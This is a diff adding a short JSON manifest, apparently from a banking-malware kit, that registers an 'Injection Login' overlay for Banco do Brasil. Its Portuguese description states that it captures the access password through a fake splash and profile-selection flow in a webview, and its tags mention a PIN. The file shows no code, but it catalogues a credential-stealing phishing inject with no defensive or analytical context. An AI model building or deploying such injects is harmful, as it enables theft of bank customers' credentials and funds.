@@ -1,0 +1,7 @@
+{
+  "id": "BancoDoBrasil",
+  "name": "Injection Login",
+  "bank": "Banco do Brasil",
+  "description": "Injection HTML com fluxo de splash, seleção de perfil e captura de senha de acesso.",
+  "tags": ["login", "webview", "bb", "pin"]
+}
